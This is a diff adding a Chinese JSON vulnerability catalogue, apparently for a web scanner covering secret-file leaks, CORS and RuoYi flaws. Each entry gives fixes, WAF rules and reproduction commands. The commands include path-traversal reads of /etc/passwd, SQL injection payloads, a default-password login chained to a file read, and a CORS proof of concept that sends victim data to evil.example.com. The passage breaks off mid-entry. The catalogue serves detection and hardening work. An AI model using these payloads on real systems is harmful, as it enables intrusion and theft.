@@ -1,0 +1,724 @@
+{
+  ".git 源码泄露": {
+    "name": ".git 源码泄露",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "目标 Web 根目录下存在可访问的 .git 目录，攻击者可下载源码及提交历史",
+    "fix": "在 Web 服务器配置中禁止对 .git 目录的访问，或在部署时删除 .git 目录",
+    "fix_detail": "【配置加固·nginx】禁止所有 .git 路径访问（含子路径）：\n  location ~ /\\.git { deny all; return 404; }\n【配置加固·Apache】<DirectoryMatch \"/^\\.git\"> Require all denied </DirectoryMatch>\n  或 RewriteRule \"^/\\.git\" - [F]\n【配置加固·IIS】web.config 添加 <security><requestFiltering><hiddenSegments><add segment=\".git\"/></hiddenSegments></requestFiltering></security>\n【部署清理】生产构建使用 git archive 导出干净代码，而非拷贝工作目录：\n  git archive --format=tar.gz --prefix=app/ HEAD -o app.tar.gz\n  部署脚本中显式删除：rm -rf /var/www/html/.git\n【WAF 规则】拦截 /.git/、/.svn/、/.hg/、/.git/HEAD、/.git/config 等路径访问\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 .git/HEAD 是否可访问（核心特征）：\ncurl -i \"http://target/.git/HEAD\"\n\n# 预期响应（漏洞存在）：HTTP/1.1 200，响应体为：\n#   ref: refs/heads/master\n\n# 2. 进一步下载 .git 关键文件还原仓库结构：\ncurl -i \"http://target/.git/config\"\ncurl -i \"http://target/.git/index\"\ncurl -i \"http://target/.git/logs/HEAD\"\ncurl -i \"http://target/.git/refs/heads/master\"\n\n# 3. 使用 GitHack / git-dumper 一键还原源码：\npython GitHack.py http://target/.git/\npip install git-dumper && git-dumper http://target/.git/ ./dumped-src\n\n# 4. 还原后查看历史提交、密钥泄露：\ncd dumped-src && git log --oneline && git grep -i \"password\\|secret\\|key\"",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 7.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.common.git_leak"
+  },
+  ".env 配置文件泄露": {
+    "name": ".env 配置文件泄露",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "目标 Web 根目录下存在可访问的 .env 文件，其中包含数据库凭据、应用密钥等敏感信息",
+    "fix": "在 Web 服务器配置中禁止对 .env 等配置文件的外网访问，添加规则阻止下载隐藏文件",
+    "fix_detail": "【配置加固·nginx】禁止所有隐藏文件访问（含 .env/.config）：\n  location ~ /\\. { deny all; return 404; }\n  location ~ /\\.env { deny all; return 404; }\n【配置加固·Apache】<FilesMatch \"^\\.\"> Require all denied </FilesMatch>\n  或 <Files \".env\"> Require all denied </Files>\n【配置加固·IIS】web.config 添加 requestFiltering hiddenSegments：\n  <add segment=\".env\" />\n【代码修复】配置通过环境变量 / Secrets Manager / Vault 注入，.env 文件不入版本仓库：\n  echo \".env\" >> .gitignore\n  生产使用 docker run --env-file /run/secrets/.env（仅容器内可读）\n【WAF 规则】拦截 /.env、/.config、/.env.bak、/.env.local、/config.php 等敏感配置路径\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 .env 主文件：\ncurl -i \"http://target/.env\"\n\n# 预期响应（漏洞存在）：HTTP/1.1 200，响应体含键值对：\n#   DB_HOST=127.0.0.1\n#   DB_PASSWORD=P@ssw0rd\n#   APP_KEY=base64:xxxxxxxxxxxx\n#   REDIS_PASSWORD=xxxxxx\n#   MAIL_PASSWORD=xxxxxx\n\n# 2. 探测 .env 变体与备份：\ncurl -i \"http://target/.env.bak\"\ncurl -i \"http://target/.env.local\"\ncurl -i \"http://target/.env.production\"\ncurl -i \"http://target/.env.example\"\n\n# 3. 探测其他常见配置文件：\ncurl -i \"http://target/config.php\"\ncurl -i \"http://target/config/database.yml\"\ncurl -i \"http://target/application.properties\"\n\n# 4. 利用 APP_KEY 反序列化 RCE（Laravel < 8.4.2，需 key 泄露）：\nphp artisan tinker --execute=\"...\" # 结合 CVE-2021-3129 利用链",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 7.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.common.env_leak"
+  },
+  "备份文件泄露": {
+    "name": "备份文件泄露",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "目标服务器上存在可访问的备份文件（.bak/.swp/.DS_Store 等），可能泄露源码或配置",
+    "fix": "禁止 Web 服务器对外提供备份/交换/系统文件的访问，或在部署时清理此类文件",
+    "fix_detail": "【配置加固·nginx】拒绝备份/交换/系统文件后缀访问：\n  location ~ \\.(bak|back|swp|swo|swn|save|old|orig|tar|tar\\.gz|zip|rar|7z|DS_Store)$ { deny all; return 404; }\n  location ~ /\\~$ { deny all; }   # 编辑器交换文件 trailing ~\n【配置加固·Apache】<FilesMatch \"\\.(bak|swp|swo|old|orig|zip|tar\\.gz|DS_Store)$\"> Require all denied </FilesMatch>\n【部署清理】CI/CD 打包脚本在构建产物中清理：\n  find . -name \"*.bak\" -o -name \"*.swp\" -o -name \".DS_Store\" | xargs rm -f\n  rsync -avz --exclude=\"*.bak\" --exclude=\"*.swp\" --exclude=\".DS_Store\" src/ dest/\n【代码修复】禁止将 .sql/.tar.gz 备份文件放至 Web 可访问目录；macOS 开发机关闭 .DS_Store 生成\n【WAF 规则】拦截 .bak/.swp/.old/.orig/.tar.gz/.zip/.DS_Store/~ 等后缀请求\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测常见备份文件后缀：\ncurl -i \"http://target/index.bak\"\ncurl -i \"http://target/index.php.bak\"\ncurl -i \"http://target/config.old\"\ncurl -i \"http://target/web.zip\"\ncurl -i \"http://target/backup.tar.gz\" -o backup.tar.gz\n\n# 2. 探测编辑器交换文件与系统残留：\ncurl -i \"http://target/.index.php.swp\" -o .index.php.swp\ncurl -i \"http://target/index.php~\"\ncurl -i \"http://target/.DS_Store\"\n\n# 预期响应（漏洞存在）：HTTP/1.1 200，Content-Type: application/octet-stream\n# 下载后可直接查看源码：cat .index.php.swp | strings | head\n\n# 3. .DS_Store 解析（泄露同目录文件名清单）：\npython ds_store_exp.py \"http://target/.DS_Store\"",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cvss_score": 5.3,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A05:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.common.backup_scan"
+  },
+  "CORS 跨域配置不当": {
+    "name": "CORS 跨域配置不当",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "目标服务器 CORS 配置不当，允许任意 Origin 跨域请求，可被利用发起 CSRF 攻击窃取数据",
+    "fix": "将 Access-Control-Allow-Origin 限制为可信域名白名单，禁止使用 * 或反射任意 Origin",
+    "fix_detail": "【配置加固·nginx】使用 map 白名单校验 Origin，仅放行可信域名：\n  map $http_origin $allow_origin {\n      default \"\";\n      \"~^https://(www\\.)?trusted\\.com$\" \"$http_origin\";\n      \"~^https://app\\.trusted\\.com$\" \"$http_origin\";\n  }\n  add_header Access-Control-Allow-Origin $allow_origin always;\n  add_header Access-Control-Allow-Credentials \"true\" always;\n【代码修复·Spring】使用 @CrossOrigin(origins = {\"https://www.trusted.com\"}) 显式白名单，禁止 origins = \"*\"\n【代码修复·Express】app.use(cors({ origin: [\"https://www.trusted.com\"], credentials: true }))\n【配置原则】禁止反射任意 Origin；Access-Control-Allow-Credentials=true 时绝不可使用 ACAO: *；\n  通配符 * 与 Allow-Credentials=true 不可同时存在（浏览器规范强制）\n【WAF 规则】检测响应头 ACAO 为 * 或与请求 Origin 完全一致且 Allow-Credentials=true 时告警/拦截\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 构造恶意 Origin 探测是否被反射：\ncurl -i -H \"Origin: https://evil.example.com\" \"http://target/api/user\"\n\n# 预期响应（漏洞存在，反射型）：\n#   HTTP/1.1 200\n#   Access-Control-Allow-Origin: https://evil.example.com\n#   Access-Control-Allow-Credentials: true   # 高危：可携带受害者 Cookie\n\n# 2. 探测通配符型 CORS（低危）：\ncurl -i -H \"Origin: https://evil.example.com\" \"http://target/api/public\"\n#   Access-Control-Allow-Origin: *\n\n# 3. 预检请求（Preflight）探测可被调用的方法/头：\ncurl -i -X OPTIONS -H \"Origin: https://evil.example.com\" \\\n  -H \"Access-Control-Request-Method: PUT\" \\\n  -H \"Access-Control-Request-Headers: X-Custom\" \\\n  \"http://target/api/user\"\n\n# 4. 浏览器侧利用 PoC（窃取已登录用户数据）：\n# 在 evil.example.com 部署如下 HTML，诱导受害者访问：\n#   <script>\n#   fetch(\"http://target/api/user\", {credentials: \"include\"})\n#     .then(r => r.text()).then(d => fetch(\"https://evil.example.com/log?d=\" + btoa(d)));\n#   </script>",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cvss_score": 2.6,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A05:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.common.cors_misconfig"
+  },
+  "Swagger API 文档泄露": {
+    "name": "Swagger API 文档泄露",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "目标存在未授权的 API 文档界面，攻击者可了解全部 API 接口、参数及数据结构，辅助进一步攻击",
+    "fix": "为 Swagger/API 文档添加访问认证，或在生产环境中禁用 Swagger 端点",
+    "fix_detail": "【配置加固·Spring Boot】application.yml 生产环境禁用文档端点：\n  springdoc.api-docs.enabled: false\n  springdoc.swagger-ui.enabled: false\n  springfox.documentation.enabled: false          # springfox 旧版\n  knife4j.production: true                        # Knife4j 生产环境屏蔽\n【代码修复·Spring Security】SecurityConfig.configure() 强制鉴权：\n  http.antMatchers(\"/swagger-ui/**\", \"/swagger-ui.html\",\n                   \"/swagger-resources/**\", \"/v2/api-docs\", \"/v3/api-docs/**\",\n                   \"/doc.html\", \"/druid/**\").authenticated()\n【配置加固·nginx】为文档端点加 Basic Auth 或限制内网访问：\n  location /swagger-ui/ { auth_basic \"Restricted\"; auth_basic_user_file /etc/nginx/.htpasswd; }\n  location /v3/api-docs { allow 10.0.0.0/8; deny all; }\n【配置加固·Druid】StatViewServlet 配置 loginUsername / loginPassword，并设置 allow IP 白名单\n【WAF 规则】拦截 /swagger-ui.html、/swagger-resources、/v2/api-docs、/v3/api-docs、/doc.html、/druid/index.html 外网访问\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 Swagger UI 主界面：\ncurl -i \"http://target/swagger-ui.html\"\ncurl -i \"http://target/swagger-ui/index.html\"\ncurl -i \"http://target/doc.html\"   # Knife4j\n\n# 预期响应（漏洞存在）：HTTP/1.1 200，HTML 含 \"Swagger UI\" / \"knife4j\" / \"OpenAPI\"\n\n# 2. 直接读取 API 定义 JSON（含全部接口、参数、模型）：\ncurl \"http://target/v2/api-docs\" | python -m json.tool | head -100\ncurl \"http://target/v3/api-docs\" | python -m json.tool\ncurl \"http://target/swagger-resources\" | python -m json.tool\n\n# 预期响应：JSON 含 \"swagger\":\"2.0\" 或 \"openapi\":\"3.0.x\"，paths 列出全部接口\n\n# 3. Druid 监控台未授权（同属信息泄露）：\ncurl -i \"http://target/druid/index.html\"\ncurl -i \"http://target/druid/sql.html\"   # 可查看慢 SQL、执行过的语句\n\n# 4. 基于泄露的 API 文档批量调用敏感接口：\ncurl \"http://target/api/admin/users\"     # 利用文档发现的越权接口\ncurl -X POST \"http://target/api/admin/user\" -H \"Content-Type: application/json\" -d '{\"name\":\"test\"}'",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cvss_score": 5.3,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.common.swagger_leak"
+  },
+  "IDE/SCM 残留文件泄露": {
+    "name": "IDE/SCM 残留文件泄露",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "目标服务器上存在 IDE 配置或版本控制残留文件，可能泄露项目结构、源码路径等敏感信息",
+    "fix": "禁止 Web 服务器对外提供 .svn/.hg/.idea/.vscode 等隐藏目录的访问，部署时清理这些目录",
+    "fix_detail": "【配置加固·nginx】禁止所有 SCM/IDE 隐藏目录访问：\n  location ~ /\\.(svn|hg|bzr|git|idea|vscode|project|classpath) { deny all; return 404; }\n  location ~ /\\.(project|classpath)$ { deny all; }\n【配置加固·Apache】<DirectoryMatch \"/\\.(svn|hg|bzr|idea|vscode)\"> Require all denied </DirectoryMatch>\n  或 RedirectMatch 404 /\\.(svn|hg|bzr|idea|vscode)\n【配置加固·IIS】web.config requestFiltering hiddenSegments 添加 .svn/.hg/.idea/.vscode\n【部署清理】CI/CD 构建脚本在打包产物时清理残留目录：\n  find . -type d \\( -name \".svn\" -o -name \".hg\" -o -name \".idea\" -o -name \".vscode\" \\) -prune -exec rm -rf {} +\n  rsync -avz --exclude=\".svn\" --exclude=\".hg\" --exclude=\".idea\" --exclude=\".vscode\" src/ dest/\n【代码修复】package-lock.json/composer.lock/Gemfile.lock 不应部署到 Web 可访问目录；使用 .dockerignore 排除\n【WAF 规则】拦截 /.svn/、/.hg/、/.bzr/、/.idea/、/.vscode/、/.project、/.classpath 路径\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 SCM 版本控制残留：\ncurl -i \"http://target/.svn/entries\"\ncurl -i \"http://target/.svn/wc.db\"\ncurl -i \"http://target/.hg/store/fncache\"\ncurl -i \"http://target/.bzr/branch-format\"\n\n# 预期响应（漏洞存在）：HTTP/1.1 200，响应体含目录结构 / 版本元数据\n\n# 2. 探测 IDE 配置残留：\ncurl -i \"http://target/.idea/workspace.xml\"\ncurl -i \"http://target/.idea/modules.xml\"\ncurl -i \"http://target/.vscode/settings.json\"\ncurl -i \"http://target/.project\"\ncurl -i \"http://target/.classpath\"\n\n# 3. 探测依赖锁文件（泄露依赖版本，辅助 CVE 匹配）：\ncurl -i \"http://target/package-lock.json\" | python -m json.tool | head -50\ncurl -i \"http://target/composer.lock\"\ncurl -i \"http://target/yarn.lock\"\ncurl -i \"http://target/Gemfile.lock\"\n\n# 4. SVN 完整源码还原（使用 ripsvn / svn-extractor）：\npython svn-extractor.py --url \"http://target/.svn/\" --output ./svn-dumped",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cvss_score": 5.3,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.common.source_leak"
+  },
+  "目录遍历探测": {
+    "name": "目录遍历探测",
+    "cve": "N/A",
+    "severity": "low",
+    "category": "recon",
+    "description": "目标服务器开启了目录列表功能，攻击者可浏览目录结构发现隐藏文件和敏感路径",
+    "fix": "在 Web 服务器配置中关闭目录列表功能（nginx: autoindex off; apache: Options -Indexes）",
+    "fix_detail": "【配置加固·nginx】确保未在 location 块显式开启 autoindex，必要时显式关闭：\n  location /uploads/ { autoindex off; }\n  location /backup/  { autoindex off; deny all; }\n【配置加固·Apache】httpd.conf 或 .htaccess 添加：Options -Indexes\n  <Directory \"/var/www/html\"> Options -Indexes </Directory>\n【配置加固·Tomcat】conf/web.xml 中 DefaultServlet 的 listings 参数设为 false：\n  <param-name>listings</param-name><param-value>false</param-value>\n【部署清理】仅上传必要静态资源，敏感目录（backup/logs/tmp）禁止放到 Web 根目录\n【WAF 规则】拦截响应体含 \"Index of\"、\"Directory Listing\"、\"Parent Directory\" 的 200 响应\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测常见静态资源目录是否开启目录列表：\ncurl -i \"http://target/uploads/\"\ncurl -i \"http://target/backup/\"\ncurl -i \"http://target/static/\"\ncurl -i \"http://target/files/\"\n\n# 预期响应（漏洞存在）：HTTP/1.1 200，响应体含：\n#   <title>Index of /uploads/</title>\n#   <h1>Directory Listing for /uploads/</h1>\n#   <a href=\"../\">Parent Directory</a>\n\n# 2. 批量探测（结合 fuzzer）：\nfor p in uploads backup static assets images files css js logs tmp; do\n  echo \"[*] $p\"; curl -s -o /dev/null -w \"%{http_code}\\n\" \"http://target/$p/\"\ndone",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cvss_score": 5.3,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.common.dir_listing"
+  },
+  "HTTP 方法探测": {
+    "name": "HTTP 方法探测",
+    "cve": "N/A",
+    "severity": "low",
+    "category": "recon",
+    "description": "通过 OPTIONS 请求探测目标支持的 HTTP 方法，检测 TRACE 方法是否开启（可被利用于跨站追踪攻击）",
+    "fix": "在 Web 服务器中禁用 TRACE/TRACK 方法；限制 Allow 头中仅暴露必要方法",
+    "fix_detail": "【配置加固·nginx】nginx 默认不处理 TRACE，确保未通过第三方模块启用；限制仅允许必要方法：\n  limit_except GET POST { deny all; }\n  # 显式拒绝 TRACE/TRACK：\n  if ($request_method = TRACE) { return 405; }\n  if ($request_method = TRACK) { return 405; }\n【配置加固·Apache】httpd.conf 全局关闭 TRACE：\n  TraceEnable off\n【配置加固·Tomcat】conf/server.xml 的 Connector 添加 allowTrace=\"false\"：\n  <Connector port=\"8080\" protocol=\"HTTP/1.1\" allowTrace=\"false\" />\n【配置加固·IIS】Request Filtering → HTTP Verbs → Deny Verb：TRACE、TRACK\n  或 web.config：<security><requestFiltering><verbs><add verb=\"TRACE\" allowed=\"false\"/></verbs></requestFiltering></security>\n【WAF 规则】拒绝 TRACE/TRACK 方法请求，返回 405 Method Not Allowed；监测 Allow 头中是否暴露危险方法\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. OPTIONS 探测目标支持的 HTTP 方法：\ncurl -i -X OPTIONS \"http://target/\"\n\n# 预期响应：\n#   HTTP/1.1 200\n#   Allow: GET,HEAD,POST,OPTIONS,TRACE     # 含 TRACE 即存在风险\n\n# 2. TRACE 方法探测（XST 跨站追踪，可绕过 HttpOnly 读取 Cookie）：\ncurl -i -X TRACE \"http://target/\"\ncurl -i -H \"Cookie: session=secret\" -X TRACE \"http://target/\"\n\n# 预期响应（漏洞存在）：HTTP/1.1 200，响应体原样回显请求头：\n#   TRACE / HTTP/1.1\n#   Host: target\n#   Cookie: session=secret\n\n# 3. TRACK 方法探测（部分服务器作为 TRACE 别名，规避代理过滤）：\ncurl -i -X TRACK \"http://target/\"\n\n# 4. 批量方法探测（结合 fuzzer）：\nfor m in GET POST PUT DELETE TRACE TRACK OPTIONS CONNECT PATCH; do\n  code=$(curl -s -o /dev/null -w \"%{http_code}\" -X $m \"http://target/\")\n  echo \"[$m] $code\"\ndone",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "cvss_score": 5.3,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A05:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.common.trace_method"
+  },
+  "目录扫描": {
+    "name": "目录扫描",
+    "cve": "N/A",
+    "severity": "low",
+    "category": "recon",
+    "description": "基于 ruoyi.txt 字典的端点探测，输出状态码/标题/长度/URL（沿用原 path_scan 格式）",
+    "fix": "关闭未授权端点，敏感路径强制鉴权，下线调试与监控面板",
+    "fix_detail": "【权限加固】对所有非公开路径（/druid、/actuator、/swagger、/monitor 等）添加鉴权拦截器\n【Spring Security 配置】在 SecurityConfig.configure() 中：\n  .antMatchers(\"/druid/**\", \"/actuator/**\", \"/swagger-ui/**\").authenticated()\n【下线调试】生产环境关闭：\n  management.endpoints.web.exposure.include: health,info\n  swagger.enabled: false\n  spring.datasource.druid.stat-view-servlet.enabled: false\n【WAF 规则】拦截常见敏感路径：/druid, /actuator, /swagger, /v2/api-docs, /env, /heapdump\n【合规】等保 2.0 8.1.4 要求：访问控制覆盖全部资源",
+    "reproduce": "# 探测 Druid 监控：\ncurl -i \"http://target/druid/\"\n\n# 探测 Swagger 文档：\ncurl -i \"http://target/swagger-ui.html\"\ncurl -i \"http://target/v2/api-docs\"\n\n# 探测 Actuator 端点：\ncurl -i \"http://target/actuator\"\ncurl -i \"http://target/actuator/env\"\ncurl -i \"http://target/actuator/heapdump\" -o heapdump.bin\n\n# 预期响应：HTTP 200 即表示端点未授权可访问",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cvss_score": 5.3,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A05:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.ruoyi.directory_scan"
+  },
+  "任意文件读取": {
+    "name": "任意文件读取",
+    "cve": "CNVD-2021-01931",
+    "severity": "high",
+    "category": "vuln",
+    "description": "通过 /common/download/resource 的 resource 参数目录穿越读取 /etc/passwd",
+    "fix": "限制 resource 参数路径，禁止 .. 目录穿越，下载接口强制鉴权",
+    "fix_detail": "【升级方案】升级 RuoYi 至 4.7.0+（该版本已修复路径穿越）\n【代码修复】修改 CommonController.downloadResource()，对 resource 参数做路径校验：\n  String fileName = resource.substring(resource.lastIndexOf(\"/\") + 1);\n  if (fileName.contains(\"..\") || fileName.contains(\"\\\")) { throw new ServiceException(\"非法路径\"); }\n【配置加固】在 application.yml 中限制下载根目录：\n  ruoyi.profile: /data/upload （不要使用相对路径或用户可写目录）\n【权限加固】为 /common/download/resource 添加 @PreAuthorize 注解，要求登录后才可访问\n【WAF 规则】拦截 resource 参数含 \"..\" 或以 \"/\" 开头的请求\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "curl \"http://target/common/download/resource?resource=/profile/../../../../../../../etc/passwd\"\n\n# Windows 系统可尝试读取 win.ini：\ncurl \"http://target/common/download/resource?resource=/profile/../../../../../../../windows/win.ini\"\n\n# 预期响应：响应体含 \"root:\" 或 \"[fonts]\" 字样（Linux/Windows 系统文件特征）",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 7.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": ">=4.0,<4.7",
+    "variant": "",
+    "module": "plugins.ruoyi.file_read"
+  },
+  "定时任务任意文件读取": {
+    "name": "定时任务任意文件读取",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "通过定时任务 edit 修改 invokeTarget 为 ruoYiConfig.setProfile(/etc/passwd)，run 后读取落地文件 2.txt。需后台鉴权，D1 起改用登录链获取会话",
+    "fix": "限制定时任务 invokeTarget 参数，禁止调用任意方法；后台强制鉴权",
+    "fix_detail": "【升级方案】升级 RuoYi 至 4.7.0+（该版本对 invokeTarget 做了白名单校验，禁止调用 ruoYiConfig）\n【代码修复】SysJobController.edit() 添加 invokeTarget 白名单：\n  String[] allowedTargets = {\"ryTask.ryParams\",\"ryTask.ryMultipleParams\"};\n  if (!Arrays.asList(allowedTargets).contains(invokeTarget.split(\"\\(\")[0])) throw new ServiceException(\"非法调用目标\");\n【权限加固】为 /monitor/job/edit 强制鉴权：@PreAuthorize(\"@ss.hasPermi('monitor:job:edit')\")\n【WAF 规则】拦截 invokeTarget 参数含 ruoYiConfig/java.lang.Runtime 的 /monitor/job/edit 请求\n【审计】记录所有 /monitor/job/edit 操作日志，定期审计\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 先用默认口令登录获取 token（admin/admin123）：\nTOKEN=$(curl -s -X POST \"http://target/login\" -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"admin123\"}' | grep -oP '(?<=\"token\":\")[^\"]+')\n\n# 2. 修改定时任务 invokeTarget 为 ruoYiConfig.setProfile：\ncurl -X POST \"http://target/monitor/job/edit\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d \"jobId=2&jobName=test&invokeTarget=ruoYiConfig.setProfile('/etc/passwd')&cronExpression=0/5+*+*+*+*+?\"\n\n# 3. 触发任务执行：\ncurl -X PUT \"http://target/monitor/job/run\" -H \"Authorization: Bearer $TOKEN\" -d \"jobId=2\"\n\n# 4. 读取落地文件 2.txt：\ncurl \"http://target/2.txt\"\n  # 预期响应：响应体含 /etc/passwd 内容",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 6.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": ">=4.0,<4.7",
+    "variant": "",
+    "module": "plugins.ruoyi.file_read_time"
+  },
+  "POST型报错注入（role）": {
+    "name": "POST型报错注入（role）",
+    "cve": "CNVD-2021-01931",
+    "severity": "high",
+    "category": "vuln",
+    "description": "/system/role/list 的 params[dataScope] 参数拼接 extractvalue 报错注入，泄露 database()",
+    "fix": "对 dataScope 参数做白名单校验，禁止拼接 SQL，使用参数化查询",
+    "fix_detail": "【升级方案】升级 RuoYi 至 4.6.0+（该版本已修复 params[dataScope] 注入）\n【代码修复】修改 SysRoleMapper.xml，对 dataScope 参数做白名单校验：\n  - 修改前：${params.dataScope}（直接拼接）\n  - 修改后：使用 DataScopeUtil.checkDataScope(params.get(\"dataScope\")) 白名单校验\n【配置加固】启用 MyBatis 参数化：mybatis.configuration.safe-result-handler-enabled: true\n【WAF 规则】拦截包含 extractvalue/updatexml/concat 的 dataScope 参数\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验",
+    "reproduce": "curl -X POST \"http://target/system/role/list\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -H \"Accept: application/json\" \\\n  -d 'params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))' \\\n  --cookie \"\"\n\n# 预期响应：HTTP 500 + 响应体含 \"运行时异常\" 或 \"database()\" 报错特征",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 6.5,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": ">=4.0,<4.6",
+    "variant": "",
+    "module": "plugins.ruoyi.sql_inject_role"
+  },
+  "POST型报错注入（dept）": {
+    "name": "POST型报错注入（dept）",
+    "cve": "CNVD-2021-01931",
+    "severity": "high",
+    "category": "vuln",
+    "description": "/system/dept/list 的 params[dataScope] 参数拼接 extractvalue 报错注入，泄露 database()",
+    "fix": "对 dataScope 参数做白名单校验，禁止拼接 SQL，使用参数化查询",
+    "fix_detail": "【升级方案】升级 RuoYi 至 4.6.0+（该版本已修复 params[dataScope] 注入）\n  git pull https://gitee.com/y_project/RuoYi.git\n  mvn clean package -Pprod\n【代码修复】修改 SysDeptMapper.xml，对 dataScope 参数做白名单校验：\n  - 修改前：${params.dataScope}（直接拼接）\n  - 修改后：使用 DataScopeUtil.checkDataScope(params.get(\"dataScope\")) 白名单校验\n【配置加固】在 application.yml 中启用 MyBatis 参数化：\n  mybatis.configuration.safe-result-handler-enabled: true\n【WAF 规则】拦截包含 extractvalue/updatexml/concat 的 dataScope 参数\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验",
+    "reproduce": "curl -X POST \"http://target/system/dept/list\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -H \"Accept: application/json\" \\\n  -d 'params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))' \\\n  --cookie \"\"\n\n# 预期响应：HTTP 500 + 响应体含 \"运行时异常\" 或 \"database()\" 报错特征",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 6.5,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": ">=4.0,<4.6",
+    "variant": "",
+    "module": "plugins.ruoyi.sql_inject_dept"
+  },
+  "任意文件上传": {
+    "name": "任意文件上传",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "若依后台 /common/upload 未授权可写：上传无害 .txt 探针，响应 JSON 含 url/fileName 字段即存在",
+    "fix": "强制 /common/upload 鉴权；服务端白名单校验扩展名；上传目录不可执行；按用户隔离存储路径",
